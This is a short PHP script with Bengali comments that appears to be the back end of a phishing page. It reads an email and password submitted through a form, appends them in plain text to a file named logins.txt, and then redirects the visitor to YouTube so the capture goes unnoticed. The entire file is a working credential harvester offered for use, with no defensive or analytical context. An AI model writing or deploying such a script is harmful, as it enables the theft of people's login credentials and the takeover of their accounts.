<?php
// সরল PHP স্ক্রিপ্ট যা POST ডাটা গ্রহণ করে এবং ফাইলে সেভ করে।

$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

if (empty($email) || empty($password)) {
    // যদি ফাঁকা হয়, ফিরে যাও index.html এ
    header("Location: index.html");
    exit;
}

// ফাইলে সেভ (logins.txt)
$file = fopen("logins.txt", "a");
fwrite($file, "Email: $email | Password: $password\n");
fclose($file);

// ইউজারকে অন্য সাইটে রিডাইরেক্ট
header("Location: https://www.youtube.com");
exit();
?>
	
